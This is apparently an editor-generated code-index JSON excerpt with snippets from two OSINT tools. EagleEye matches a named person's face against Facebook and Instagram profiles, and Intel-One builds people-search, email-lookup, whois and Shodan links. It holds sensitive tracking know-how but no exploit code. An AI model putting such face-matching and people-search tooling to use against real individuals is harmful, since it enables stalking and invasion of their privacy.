        "peekOfCode": "def google_filter():\n    return cfg['FILTER']\ndef instaLimit():\n    return int(cfg['INSTA_VALIDATION_MAX_IMAGES'])\ndef jitters():\n    return int(cfg['JITTERS'])\ndef getWebDriver():\n    if not os.path.isfile(cfg['WEBDRIVER']['PATH']):\n        print(\"{0} does not exist - install a webdriver\".format(cfg['WEBDRIVER']['PATH']))\n        sys.exit(-2)",
        "detail": "libs.programs.EagleEye.utils.config",
        "documentation": {}
    },
    {
        "label": "instaLimit",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.config",
        "description": "libs.programs.EagleEye.utils.config",
        "peekOfCode": "def instaLimit():\n    return int(cfg['INSTA_VALIDATION_MAX_IMAGES'])\ndef jitters():\n    return int(cfg['JITTERS'])\ndef getWebDriver():\n    if not os.path.isfile(cfg['WEBDRIVER']['PATH']):\n        print(\"{0} does not exist - install a webdriver\".format(cfg['WEBDRIVER']['PATH']))\n        sys.exit(-2)\n    d = cfg['WEBDRIVER']['ENGINE']\n    if d.lower() == 'firefox':",
        "detail": "libs.programs.EagleEye.utils.config",
        "documentation": {}
    },
    {
        "label": "jitters",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.config",
        "description": "libs.programs.EagleEye.utils.config",
        "peekOfCode": "def jitters():\n    return int(cfg['JITTERS'])\ndef getWebDriver():\n    if not os.path.isfile(cfg['WEBDRIVER']['PATH']):\n        print(\"{0} does not exist - install a webdriver\".format(cfg['WEBDRIVER']['PATH']))\n        sys.exit(-2)\n    d = cfg['WEBDRIVER']['ENGINE']\n    if d.lower() == 'firefox':\n        os.environ[\"webdriver.firefox.driver\"] = cfg['WEBDRIVER']['PATH']\n        p = os.path.join(tempfile.gettempdir(), 'imageraider')",
        "detail": "libs.programs.EagleEye.utils.config",
        "documentation": {}
    },
    {
        "label": "getWebDriver",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.config",
        "description": "libs.programs.EagleEye.utils.config",
        "peekOfCode": "def getWebDriver():\n    if not os.path.isfile(cfg['WEBDRIVER']['PATH']):\n        print(\"{0} does not exist - install a webdriver\".format(cfg['WEBDRIVER']['PATH']))\n        sys.exit(-2)\n    d = cfg['WEBDRIVER']['ENGINE']\n    if d.lower() == 'firefox':\n        os.environ[\"webdriver.firefox.driver\"] = cfg['WEBDRIVER']['PATH']\n        p = os.path.join(tempfile.gettempdir(), 'imageraider')\n        if not os.path.isdir(p):\n            os.makedirs(p)",
        "detail": "libs.programs.EagleEye.utils.config",
        "documentation": {}
    },
    {
        "label": "banner",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def banner():\n    logo = \"\"\"\n███████╗ █████╗  ██████╗ ██╗     ███████╗       ███████╗██╗   ██╗███████╗\n██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝       ██╔════╝╚██╗ ██╔╝██╔════╝\n█████╗  ███████║██║  ███╗██║     █████╗ Version █████╗   ╚████╔╝ █████╗  \n██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝   {0}   ██╔══╝    ╚██╔╝  ██╔══╝  \n███████╗██║  ██║╚██████╔╝███████╗███████╗       ███████╗   ██║   ███████╗\n╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝       ╚══════╝   ╚═╝   ╚══════╝\n                {1}, you have been activated                                                                   \n    \"\"\"",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "clear",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def clear():\n    os.system('cls' if os.name == 'nt' else 'clear')\ndef section(name):\n    print(\"\\n{} {}\".format(\n        colored(\"::\", 'blue', attrs=['bold']),\n        colored(name, attrs=['bold'])\n        )\n    )\ndef task(name):\n    print('{} {}'.format(",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "section",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def section(name):\n    print(\"\\n{} {}\".format(\n        colored(\"::\", 'blue', attrs=['bold']),\n        colored(name, attrs=['bold'])\n        )\n    )\ndef task(name):\n    print('{} {}'.format(\n        colored(\"==>\", 'green', attrs=['bold']),\n        colored(name, attrs=['bold'])",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "task",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def task(name):\n    print('{} {}'.format(\n        colored(\"==>\", 'green', attrs=['bold']),\n        colored(name, attrs=['bold'])\n        )\n    )\ndef subtask(name):\n    print('{} {}'.format(\n        colored(\"  ->\", 'blue', attrs=['bold']),\n        colored(name, attrs=['bold'])",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "subtask",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def subtask(name):\n    print('{} {}'.format(\n        colored(\"  ->\", 'blue', attrs=['bold']),\n        colored(name, attrs=['bold'])\n        )\n    )\ndef failure(name):\n    print('{} {}'.format(\n        colored(\"==> ERROR:\", 'red', attrs=['bold']),\n        colored(name, attrs=['bold'])",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "failure",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def failure(name):\n    print('{} {}'.format(\n        colored(\"==> ERROR:\", 'red', attrs=['bold']),\n        colored(name, attrs=['bold'])\n        )\n    )\ndef subfailure(name):\n    print('{} {}'.format(\n        colored(\"  ->\", 'red', attrs=['bold']),\n        colored(name, 'red', attrs=['bold'])",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "subfailure",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def subfailure(name):\n    print('{} {}'.format(\n        colored(\"  ->\", 'red', attrs=['bold']),\n        colored(name, 'red', attrs=['bold'])\n        )\n    )\ndef prompt(name):\n    print('{} {}'.format(\n        colored(\"==>\", 'yellow', attrs=['bold']),\n        colored(name, attrs=['bold'])),",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "prompt",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def prompt(name):\n    print('{} {}'.format(\n        colored(\"==>\", 'yellow', attrs=['bold']),\n        colored(name, attrs=['bold'])),\n        end=\"\"\n    )\ndef subprompt(name):\n    print('{} {}'.format(\n        colored(\"  ->\", 'yellow', attrs=['bold']),\n        colored(name, attrs=['bold'])),",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "subprompt",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "def subprompt(name):\n    print('{} {}'.format(\n        colored(\"  ->\", 'yellow', attrs=['bold']),\n        colored(name, attrs=['bold'])),\n        end=\"\")",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "VER",
        "kind": 5,
        "importPath": "libs.programs.EagleEye.utils.console",
        "description": "libs.programs.EagleEye.utils.console",
        "peekOfCode": "VER = \"0.2\"\ndef banner():\n    logo = \"\"\"\n███████╗ █████╗  ██████╗ ██╗     ███████╗       ███████╗██╗   ██╗███████╗\n██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝       ██╔════╝╚██╗ ██╔╝██╔════╝\n█████╗  ███████║██║  ███╗██║     █████╗ Version █████╗   ╚████╔╝ █████╗  \n██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝   {0}   ██╔══╝    ╚██╔╝  ██╔══╝  \n███████╗██║  ██║╚██████╔╝███████╗███████╗       ███████╗   ██║   ███████╗\n╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝       ╚══════╝   ╚═╝   ╚══════╝\n                {1}, you have been activated                                                                   ",
        "detail": "libs.programs.EagleEye.utils.console",
        "documentation": {}
    },
    {
        "label": "presentResult",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.eagle-eye",
        "description": "libs.programs.EagleEye.eagle-eye",
        "peekOfCode": "def presentResult(predictions):\n    if len(predictions) > 0:\n        argmax = Counter(predictions)\n        console.section(\"Result\")\n        if len(argmax.most_common(n=1)) > 0:\n            (most_common_str, _) = argmax.most_common(n=1)[0]\n        else:\n            most_common_str = 'None'\n        console.task(\"Google says it could be: {0}\".format(most_common_str))\n    else:",
        "detail": "libs.programs.EagleEye.eagle-eye",
        "documentation": {}
    },
    {
        "label": "filterInstaLinks",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.eagle-eye",
        "description": "libs.programs.EagleEye.eagle-eye",
        "peekOfCode": "def filterInstaLinks(links):\n    r = []\n    for l in links:\n        if \"www.instagram.com\" in l:\n            r.append(l)\n    return r\ndef parseInstaUsername(links):\n    usernames = []\n    for l in links:\n        a = l[8:]",
        "detail": "libs.programs.EagleEye.eagle-eye",
        "documentation": {}
    },
    {
        "label": "parseInstaUsername",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.eagle-eye",
        "description": "libs.programs.EagleEye.eagle-eye",
        "peekOfCode": "def parseInstaUsername(links):\n    usernames = []\n    for l in links:\n        a = l[8:]\n        a = a.split('/')\n        if len(a) >= 2:\n            if len(a[1]) >= 4:\n                usernames.append(a[1])\n        else:\n            console.subfailure('Error parsing {0}'.format(l))",
        "detail": "libs.programs.EagleEye.eagle-eye",
        "documentation": {}
    },
    {
        "label": "validateInstaUser",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.eagle-eye",
        "description": "libs.programs.EagleEye.eagle-eye",
        "peekOfCode": "def validateInstaUser(username, num_jitters):\n    images = getInstaLinks(username)\n    #print(images)\n    if len(images) >= cfg.instaLimit():\n        images = images[:cfg.instaLimit()]\n    r = FaceRecog(username, images, num_jitters=num_jitters)\n    r.loadKnown(username)\n    profile_links, _ = r.getValidLinksAndImg(username)\n    return len(profile_links) > 0\ndef getInstaLinks(username):",
        "detail": "libs.programs.EagleEye.eagle-eye",
        "documentation": {}
    },
    {
        "label": "getInstaLinks",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.eagle-eye",
        "description": "libs.programs.EagleEye.eagle-eye",
        "peekOfCode": "def getInstaLinks(username):\n    instagrabber = InstagramGrabber(username)\n    return instagrabber.getLinks()\ndef main(skipFB=False, FBUrls=[], jsonRep=None, dockerMode=False, dockerName=None):\n    if not skipFB:\n        # collect user input\n        if dockerMode:\n            console.section(\"Running in DOCKER MODE\")\n            name = dockerName\n        else:",
        "detail": "libs.programs.EagleEye.eagle-eye",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "libs.programs.EagleEye.eagle-eye",
        "description": "libs.programs.EagleEye.eagle-eye",
        "peekOfCode": "def main(skipFB=False, FBUrls=[], jsonRep=None, dockerMode=False, dockerName=None):\n    if not skipFB:\n        # collect user input\n        if dockerMode:\n            console.section(\"Running in DOCKER MODE\")\n            name = dockerName\n        else:\n            console.prompt('Enter the persons name to find on FB: ')\n            name = input('')\n            while not name:",
        "detail": "libs.programs.EagleEye.eagle-eye",
        "documentation": {}
    },
    {
        "label": "FaceRecog",
        "kind": 6,
        "importPath": "libs.programs.EagleEye.face_recog",
        "description": "libs.programs.EagleEye.face_recog",
        "peekOfCode": "class FaceRecog:\n    def __init__(self, profile_list, profile_img, num_jitters=10):\n        self.profile_list = profile_list\n        self.profile_img = profile_img\n        self.num_jitters = num_jitters\n        self.known_face_encodings = []\n        self.known_face_names = []\n        console.section('Starting Face Recognition')\n    def loadKnown(self, label):    \n        console.task('Loading known faces')",
        "detail": "libs.programs.EagleEye.face_recog",
        "documentation": {}
    },
    {
        "label": "Companies",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.companies",
        "description": "libs.programs.Intel-One.search.companies",
        "peekOfCode": "class Companies(qu.Query):\n    def __init__(self, query):\n        qu.Query.__init__(self, query)\n    # Provides a searchable link in corporation wiki for the target company queried.\n    def companySearch(self):\n        parsedQuery = util.Utilities.parseQuery(self.getQuery)\n        edgarLink = 'https://www.sec.gov/cgi-bin/browse-edgar?company=' + parsedQuery + '&owner=exclude&action=getcompany'\n        cwLink = 'https://www.corporationwiki.com/search/results?term=' + parsedQuery\n        hoovers = 'http://www.hoovers.com/company-information/company-search.html?term=' + parsedQuery\n        glassdoor = 'https://www.glassdoor.com/Job/jobs.htm?suggestCount=0&suggestChosen=false&clickSource=searchBtn&typedKeyword=microsoft&sc.keyword=' + parsedQuery + '&locT=&locId=&jobType='",
        "detail": "libs.programs.Intel-One.search.companies",
        "documentation": {}
    },
    {
        "label": "Domains",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.domains",
        "description": "libs.programs.Intel-One.search.domains",
        "peekOfCode": "class Domains(qu.Query):\n    def __init__(self, query):\n        qu.Query.__init__(self, query)\n    # Performs search in who.is records giving information about a target domain.\n    def whoIsSearch(self):\n        # search string used in the address bar to perform search.\n        parsedQuery = util.Utilities.parseQuery(self.getQuery)\n        pageGlimpse = 'http://www.pageglimpse.com/' + parsedQuery\n        whoIsLink_0 = 'https://who.is/whois/' + parsedQuery\n        whoIsLink_1 = 'http://www.dnsstuff.com/tools#whois|type=domain&&value=' + parsedQuery",
        "detail": "libs.programs.Intel-One.search.domains",
        "documentation": {}
    },
    {
        "label": "SearchEngines",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.engines",
        "description": "libs.programs.Intel-One.search.engines",
        "peekOfCode": "class SearchEngines(qu.Query):\n    def __init__(self, query):\n        qu.Query.__init__(self, query)\n    # Top level domain search\n    __TLD__ = \"com\"\n    # Number of results we want back\n    __NUM_RESULTS__ = 8\n    # Last result to retrieve.  Use none if you want to search forever.\n    __STOP__ = 1\n    # Lapse to wait between HTTP requests.",
        "detail": "libs.programs.Intel-One.search.engines",
        "documentation": {}
    },
    {
        "label": "PeopleSearchEngines",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.engines",
        "description": "libs.programs.Intel-One.search.engines",
        "peekOfCode": "class PeopleSearchEngines(SearchEngines):\n    def __init__(self, query):\n        qu.Query.__init__(self, query)\n    # Performs a search in www.pipl.com to capture the social media not captured above.\n    def peopleSearch(self):\n        parsedQuery = util.Utilities.parseQuery(self.getQuery)\n        parse411 = self.__411parse__()\n        peekParse = self._peekParse__()\n        piplLink = 'https://pipl.com/search/?q=' + parsedQuery\n        canadaLink = 'http://www.canada411.ca/search/?stype=si&what=' + parsedQuery",
        "detail": "libs.programs.Intel-One.search.engines",
        "documentation": {}
    },
    {
        "label": "EmailValidityEngine",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.engines",
        "description": "libs.programs.Intel-One.search.engines",
        "peekOfCode": "class EmailValidityEngine(SearchEngines):\n    def __init__(self, query):\n        qu.Query.__init__(self, query)\n    # This function performs search to the optional location in www.pipl.com.\n    def emailValidity(self):\n        evLink_0 = 'https://mailjagger.ga/api/validate/' + self.getQuery\n        evLink_1 = 'http://www.reversegenie.com/email_search/' + self.getQuery\n        revLookup = 'https://thatsthem.com/email/' + self.getQuery\n        print(evLink_0)\n        print(evLink_1)",
        "detail": "libs.programs.Intel-One.search.engines",
        "documentation": {}
    },
    {
        "label": "Other",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.other",
        "description": "libs.programs.Intel-One.search.other",
        "peekOfCode": "class Other(qu.Query):\n    def __init__(self, query):\n        qu.Query.__init__(self, query)\n    # Performs a search in www.who.is to capture information about a target domain.\n    def shodanSearch(self):\n        shodanLink = 'https://www.shodan.io/search?query=' + util.Utilities.parseQuery(self.getQuery)\n        print(shodanLink)\n        print()\n        webbrowser.open(shodanLink)",
        "detail": "libs.programs.Intel-One.search.other",
        "documentation": {}
    },
    {
        "label": "Query",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.query",
        "description": "libs.programs.Intel-One.search.query",
        "peekOfCode": "class Query(object):\n    def __init__(self, query):\n        self.__query = str(query)\n    # The getter method\n    @property\n    def getQuery(self):\n        return self.__query",
        "detail": "libs.programs.Intel-One.search.query",
        "documentation": {}
    },
    {
        "label": "SocialMedia",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.socialMedia",
        "description": "libs.programs.Intel-One.search.socialMedia",
        "peekOfCode": "class SocialMedia(qu.Query):\n    def __init__(self, query):\n        qu.Query.__init__(self, query)\n    # Advanced google dork used for returning results including the provided url.\n    __INURL__ = \"+site:\"\n    # Social media websites that are currently supported by our tool.\n    __FACEBOOK__ = \"facebook.com\"\n    __LINKEDIN__ = \"linkedin.com\"\n    __TWITTER__ = \"twitter.com\"\n    __INSTAGRAM__ = \"instagram.com\"",
        "detail": "libs.programs.Intel-One.search.socialMedia",
        "documentation": {}
    },
    {
        "label": "Utilities",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.search.utilities",
        "description": "libs.programs.Intel-One.search.utilities",
        "peekOfCode": "class Utilities(object):\n    # Flags intro used by the user to indicate an action.\n    __SH_FLAG__ = '-'\n    __LO_FLAG__ = '--'\n    # Uses social searcher website collecting posts on given keyword on all social media.\n    __startString__ = 0\n    # The length of the space character, used to remove trailing space at the end of parsing keyword.\n    __spaceCharLength__ = 1\n    # Maximum number of spaces allowed without proceeding into further parsing.\n    __spaceMAX__ = 1",
        "detail": "libs.programs.Intel-One.search.utilities",
        "documentation": {}
    },
    {
        "label": "TestCompanies",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.tests.companiesTests",
        "description": "libs.programs.Intel-One.tests.companiesTests",
        "peekOfCode": "class TestCompanies(TestCase):\n    # tests if search is returning back the correct link for two terms.\n    def test_annualReportSearch_shortFlag(self):\n        q = \"natwest -are\"\n        query = companies.Companies(q)\n        with TestCompanies.captured_output(self) as (out, err):\n            companies.Companies.annualReportSearch(query)\n        link = out.getvalue().strip()\n        self.assertEqual(link, 'http://www.annualreports.com/Companies?search=natwest\\n'\n                               'https://www.reportlinker.com/report/search/keywords/natwest\\n'",
        "detail": "libs.programs.Intel-One.tests.companiesTests",
        "documentation": {}
    },
    {
        "label": "TestDomains",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.tests.domainsTests",
        "description": "libs.programs.Intel-One.tests.domainsTests",
        "peekOfCode": "class TestDomains(TestCase):\n    # tests if scan search is returning back the correct link for single flag.\n    def test_scanSearch_shortFlag(self):\n        q = \"www.abc.com -sc\"\n        query = domains.Domains(q)\n        with TestDomains.captured_output(self) as (out, err):\n            domains.Domains.scanSearch(query)\n        link = out.getvalue().strip()\n        self.assertEqual(link, 'https://asafaweb.com/Scan?Url=www.abc.com')\n    # tests if scan search is returning back the correct link for big flag.",
        "detail": "libs.programs.Intel-One.tests.domainsTests",
        "documentation": {}
    },
    {
        "label": "TestEngines",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.tests.enginesTests",
        "description": "libs.programs.Intel-One.tests.enginesTests",
        "peekOfCode": "class TestEngines(TestCase):\n    # tests if duck duck go search is returning back the correct link for short flag.\n    def test_ddGo_shortFlag(self):\n        q = \"glovdi -ddg\"\n        query = engines.SearchEngines(q)\n        with TestEngines.captured_output(self) as (out, err):\n            engines.SearchEngines.ddGoSearch(query)\n        link = out.getvalue().strip()\n        self.assertEqual(link, 'https://duckduckgo.com/?q=glovdi')\n    # tests if duck duck go search is returning back the correct link for long flag.",
        "detail": "libs.programs.Intel-One.tests.enginesTests",
        "documentation": {}
    },
    {
        "label": "TestOther",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.tests.otherTests",
        "description": "libs.programs.Intel-One.tests.otherTests",
        "peekOfCode": "class TestOther(TestCase):\n    # tests if shodan search is returning back the correct link for single flag.\n    def test_shodanSearch_shortFlag(self):\n        q = \"zanussi -sh\"\n        query = other.Other(q)\n        with TestOther.captured_output(self) as (out, err):\n            other.Other.shodanSearch(query)\n        link = out.getvalue().strip()\n        self.assertEqual(link, 'https://www.shodan.io/search?query=zanussi')\n    # tests if whois search is returning back the correct link for big flag.",
        "detail": "libs.programs.Intel-One.tests.otherTests",
        "documentation": {}
    },
    {
        "label": "TestSocialMedia",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.tests.socialMediaTests",
        "description": "libs.programs.Intel-One.tests.socialMediaTests",
        "peekOfCode": "class TestSocialMedia(TestCase):\n    # tests if source code search is giving correct output.\n    def test_sourceCodeSearch_shortFlag(self):\n        q = \"whodis -gh\"\n        query = sm.SocialMedia(q)\n        with TestSocialMedia.captured_output(self) as (out, err):\n            sm.SocialMedia.sourceCodeSearch(query)\n        link = out.getvalue().strip()\n        self.assertEqual(link, 'https://nerdydata.com/search?query=whodis\\n'\n                               'https://github.com/search?q=whodis')",
        "detail": "libs.programs.Intel-One.tests.socialMediaTests",
        "documentation": {}
    },
    {
        "label": "TestUtilities",
        "kind": 6,
        "importPath": "libs.programs.Intel-One.tests.utilitiesTests",
        "description": "libs.programs.Intel-One.tests.utilitiesTests",
        "peekOfCode": "class TestUtilities(TestCase):\n    # tests if query parsing is done properly with short flag.\n    def test_parseQuery_shortFlag(self):\n        query = \"www.abc.com -flag\"\n        parsedQuery = util.Utilities.parseQuery(query)\n        self.assertEqual('www.abc.com', parsedQuery)\n    # tests if query parsing is done properly with long flag.\n    def test_parseQuery_longFlag(self):\n        query = \"www.abc.com --flag\"\n        parsedQuery = util.Utilities.parseQuery(query)",
        "detail": "libs.programs.Intel-One.tests.utilitiesTests",
        "documentation": {}
    },
    {
        "label": "help",
        "kind": 2,
        "importPath": "libs.programs.Intel-One.help",
        "description": "libs.programs.Intel-One.help",
        "peekOfCode": "def help():\n    print(\"\"\"\nPlease refer to 'Issues' section in GitHub for any problems you may have.\n-- [ Options for Help & Symbols Explained ] --\nOptions Short/Long  |  Description                                      |  Example                                 \n=================== + ================================================= + =============================================\nhelp                | Prints help on screen                             | Intel-One >> help              \n'|' symbol          | Means 'or'                                        | Intel-One >> click 1 | 2 means click 1 or 2  \n'-' symbol          | Used for the short flag                           | Intel-One >> john smith -g                   \n'--' symbol         | Used for the long flag                            | Intel-One >> john smith --google             ",
        "detail": "libs.programs.Intel-One.help",
        "documentation": {}
    },
    {
        "label": "__listLastIndex__",
        "kind": 5,
        "importPath": "libs.programs.Intel-One.intel-one",
        "description": "libs.programs.Intel-One.intel-one",
        "peekOfCode": "__listLastIndex__ = 1\n# The main thread of the program.\nif __name__ == '__main__':\n    # picks one of the welcome messages randomly.\n    welcomeMessage = intro.welcomeMessage()\n    # the main loop of the program running constantly until ctl+C or exit/quit is used.\n    while True:\n        # holds the current command of the user.\n        userQuery = str(input('Intel-One >> '))\n        parsedUserQuery = userQuery.split(' ')",
        "detail": "libs.programs.Intel-One.intel-one",
        "documentation": {}
    },
    {
        "label": "version",
        "kind": 2,
        "importPath": "libs.programs.Intel-One.intro",
        "description": "libs.programs.Intel-One.intro",
        "peekOfCode": "def version():\n    print(\"\"\"\nVersion 1.0 - Written by Joseph Katsioloudes, 2018.\nPlease press 'help' for user manual and options.\nPress exit or quit to exit the program\nPlease refer to 'Issues' section in GitHub for any problems you may have.\n\"\"\")\ndef welcomeMessage_0():\n    print(\"\"\"\n                  ___                       ___                         ___           ___           ___     ",
        "detail": "libs.programs.Intel-One.intro",
        "documentation": {}
    },
    {
        "label": "welcomeMessage_0",
        "kind": 2,
        "importPath": "libs.programs.Intel-One.intro",
        "description": "libs.programs.Intel-One.intro",
        "peekOfCode": "def welcomeMessage_0():\n    print(\"\"\"\n                  ___                       ___                         ___           ___           ___     \n    ___          /__/\\          ___        /  /\\                       /  /\\         /__/\\         /  /\\    \n   /  /\\         \\  \\:\\        /  /\\      /  /:/_                     /  /::\\        \\  \\:\\       /  /:/_   \n  /  /:/          \\  \\:\\      /  /:/     /  /:/ /\\    ___     ___    /  /:/\\:\\        \\  \\:\\     /  /:/ /\\  \n /__/::\\      _____\\__\\:\\    /  /:/     /  /:/ /:/_  /__/\\   /  /\\  /  /:/  \\:\\   _____\\__\\:\\   /  /:/ /:/_ \n \\__\\/\\:\\__  /__/::::::::\\  /  /::\\    /__/:/ /:/ /\\ \\  \\:\\ /  /:/ /__/:/ \\__\\:\\ /__/::::::::\\ /__/:/ /:/ /\\/\n    \\  \\:\\/\\ \\  \\:\\~~\\~~\\/ /__/:/\\:\\   \\  \\:\\/:/ /:/  \\  \\:\\  /:/  \\  \\:\\ /  /:/ \\  \\:\\~~\\~~\\/ \\  \\:\\/:/ /:/\n     \\__\\::/  \\  \\:\\  ~~~  \\__\\/  \\:\\   \\  \\::/ /:/    \\  \\:\\/:/    \\  \\:\\  /:/   \\  \\:\\  ~~~   \\  \\::/ /:/ ",
        "detail": "libs.programs.Intel-One.intro",
        "documentation": {}
    },
    {
        "label": "welcomeMessage_1",
        "kind": 2,
        "importPath": "libs.programs.Intel-One.intro",
        "description": "libs.programs.Intel-One.intro",
        "peekOfCode": "def welcomeMessage_1():\n    print(\"\"\"\n██╗███╗   ██╗████████╗███████╗██╗             ██████╗ ███╗   ██╗███████╗\n██║████╗  ██║╚══██╔══╝██╔════╝██║            ██╔═══██╗████╗  ██║██╔════╝\n██║██╔██╗ ██║   ██║   █████╗  ██║    █████╗  ██║   ██║██╔██╗ ██║█████╗  \n██║██║╚██╗██║   ██║   ██╔══╝  ██║    ╚════╝  ██║   ██║██║╚██╗██║██╔══╝  \n██║██║ ╚████║   ██║   ███████╗███████╗       ╚██████╔╝██║ ╚████║███████╗\n╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝        ╚═════╝ ╚═╝  ╚═══╝╚══════╝                  \n    \"\"\")\n    version()",
        "detail": "libs.programs.Intel-One.intro",
        "documentation": {}
    },
    {
        "label": "welcomeMessage_2",
        "kind": 2,
        "importPath": "libs.programs.Intel-One.intro",
        "description": "libs.programs.Intel-One.intro",
        "peekOfCode": "def welcomeMessage_2():\n    print(\"\"\"                                                                                                                                                                                                                                                                                                \nIIIIIIIIII                         tttt                             lllllll                                                                         \nI::::::::I                      ttt:::t                             l:::::l                                                                         \nI::::::::I                      t:::::t                             l:::::l                                                                         \nII::::::II                      t:::::t                             l:::::l                                                                         \n  I::::Innnn  nnnnnnnn    ttttttt:::::ttttttt        eeeeeeeeeeee    l::::l                     ooooooooooo   nnnn  nnnnnnnn        eeeeeeeeeeee    \n  I::::In:::nn::::::::nn  t:::::::::::::::::t      ee::::::::::::ee  l::::l                   oo:::::::::::oo n:::nn::::::::nn    ee::::::::::::ee  \n  I::::In::::::::::::::nn t:::::::::::::::::t     e::::::eeeee:::::eel::::l                  o:::::::::::::::on::::::::::::::nn  e::::::eeeee:::::ee\n  I::::Inn:::::::::::::::ntttttt:::::::tttttt    e::::::e     e:::::el::::l  --------------- o:::::ooooo:::::onn:::::::::::::::ne::::::e     e:::::e",
        "detail": "libs.programs.Intel-One.intro",
        "documentation": {}
    },
    {
        "label": "welcomeMessage_3",
        "kind": 2,
        "importPath": "libs.programs.Intel-One.intro",
        "description": "libs.programs.Intel-One.intro",
        "peekOfCode": "def welcomeMessage_3():\n    print(\"\"\"\n .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------. \n| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |\n| |     _____    | || | ____  _____  | || |  _________   | || |  _________   | || |   _____      | || |              | || |     ____     | || | ____  _____  | || |  _________   | |\n| |    |_   _|   | || ||_   \\|_   _| | || | |  _   _  |  | || | |_   ___  |  | || |  |_   _|     | || |              | || |   .'    `.   | || ||_   \\|_   _| | || | |_   ___  |  | |\n| |      | |     | || |  |   \\ | |   | || | |_/ | | \\_|  | || |   | |_  \\_|  | || |    | |       | || |    ______    | || |  /  .--.  \\  | || |  |   \\ | |   | || |   | |_  \\_|  | |\n| |      | |     | || |  | |\\ \\| |   | || |     | |      | || |   |  _|  _   | || |    | |   _   | || |   |______|   | || |  | |    | |  | || |  | |\\ \\| |   | || |   |  _|  _   | |\n| |     _| |_    | || | _| |_\\   |_  | || |    _| |_     | || |  _| |___/ |  | || |   _| |__/ |  | || |              | || |  \\  `--'  /  | || | _| |_\\   |_  | || |  _| |___/ |  | |\n| |    |_____|   | || ||_____|\\____| | || |   |_____|    | || | |_________|  | || |  |________|  | || |              | || |   `.____.'   | || ||_____|\\____| | || | |_________|  | |",
        "detail": "libs.programs.Intel-One.intro",
        "documentation": {}
    },
    {
        "label": "welcomeMessage_4",
        "kind": 2,
        "importPath": "libs.programs.Intel-One.intro",
        "description": "libs.programs.Intel-One.intro",
        "peekOfCode": "def welcomeMessage_4():\n    print(\"\"\"\n          _____                    _____                _____                    _____                    _____           _______                   _____                    _____          \n         /\\    \\                  /\\    \\              /\\    \\                  /\\    \\                  /\\    \\         /::\\    \\                 /\\    \\                  /\\    \\         \n        /::\\    \\                /::\\____\\            /::\\    \\                /::\\    \\                /::\\____\\       /::::\\    \\               /::\\____\\                /::\\    \\        \n        \\:::\\    \\              /::::|   |            \\:::\\    \\              /::::\\    \\              /:::/    /      /::::::\\    \\             /::::|   |               /::::\\    \\       \n         \\:::\\    \\            /:::::|   |             \\:::\\    \\            /::::::\\    \\            /:::/    /      /::::::::\\    \\           /:::::|   |              /::::::\\    \\      \n          \\:::\\    \\          /::::::|   |              \\:::\\    \\          /:::/\\:::\\    \\          /:::/    /      